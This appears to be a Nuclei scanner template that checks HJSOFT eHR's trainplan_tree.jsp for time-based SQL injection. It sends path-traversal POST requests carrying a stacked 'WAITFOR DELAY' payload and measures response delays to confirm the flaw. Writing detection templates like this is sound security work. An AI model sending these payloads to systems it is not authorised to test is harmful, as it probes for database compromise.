id: hjsoft-ehr-trainplan-tree-sqli
info:
  name: "HJSOFT eHR trainplan_tree.jsp SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: HJSOFT_eHR

http:
  - raw:
      - |
        POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        classId=1;WAITFOR DELAY '0:0:5'--
      - |
        POST /templates/attestation/../../train/traincourse/trainplan_tree.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        classId=1;WAITFOR DELAY '0:0:8'--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "title=\"trainType\""
          - "<?xml version"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
  
